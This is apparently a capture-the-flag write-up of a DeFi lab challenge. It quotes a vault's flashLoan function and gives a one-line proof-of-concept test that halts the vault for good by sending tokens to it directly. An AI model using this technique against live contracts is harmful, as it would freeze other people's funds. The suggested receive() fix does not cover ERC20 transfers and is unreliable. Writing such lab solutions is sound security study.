# Unstoppable

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.


### [H-1] Attacker can transfer underlyin tokens to the vault without deposit, making the contract halt

**Description:**\
In a point of `UstoppableVaul::flashLoan` function, the shares from the totalSupply (vault's deposited tokens) is compared with the totalAssets() (tokens property of the vault). some user can transfer an amount of the allowed token to de vault, making to this comparision revert the transaction and continuing reverting

<details>
<summary>UstoppableVaul::flashLoan</summary>

```javascript
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();

 @>     if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```
</details>

**Impact:**\
The voult will be halt permanently

**Proof of Concept:**\
The following test pass the challenge:

```javascript
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    console.log("Vault assets balance: ", vault.totalAssets());
    console.log("Vault shares balance: ", vault.convertToShares(vault.totalSupply()));
}
```
**Recommended Mitigation:**\
Implement a `receive()` function that update the realated balances.


